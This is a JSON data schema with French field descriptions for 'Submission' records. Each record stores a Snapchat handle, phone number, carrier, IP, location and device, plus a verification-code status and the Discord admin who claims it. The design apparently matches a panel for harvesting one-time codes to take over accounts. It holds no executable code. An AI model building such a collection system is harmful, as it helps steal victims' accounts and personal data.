{
  "name": "Submission",
  "type": "object",
  "properties": {
    "snapchat": {
      "type": "string",
      "description": "Pseudo Snapchat de l'utilisateur"
    },
    "telephone": {
      "type": "string",
      "description": "Num\u00e9ro de t\u00e9l\u00e9phone"
    },
    "operateur": {
      "type": "string",
      "enum": [
        "SFR",
        "Bouygues",
        "Orange"
      ],
      "description": "Op\u00e9rateur t\u00e9l\u00e9phonique"
    },
    "status": {
      "type": "string",
      "enum": [
        "pending",
        "code_ready",
        "code_valid",
        "code_wrong",
        "code_expired",
        "waiting_queue"
      ],
      "default": "pending",
      "description": "Statut de la demande"
    },
    "code_sent_at": {
      "type": "string",
      "format": "date-time",
      "description": "Timestamp d'envoi du code"
    },
    "ip_address": {
      "type": "string",
      "description": "Adresse IP du demandeur"
    },
    "country": {
      "type": "string",
      "description": "Pays d\u00e9tect\u00e9 par g\u00e9olocalisation"
    },
    "browser": {
      "type": "string",
      "description": "Navigateur utilis\u00e9"
    },
    "device_type": {
      "type": "string",
      "enum": [
        "phone",
        "tablet",
        "desktop"
      ],
      "description": "Type d'appareil"
    },
    "claimed_by": {
      "type": "string",
      "description": "Discord user ID de l'admin qui a pris en charge"
    }
  },
  "required": [
    "snapchat",
    "telephone",
    "operateur"
  ]
}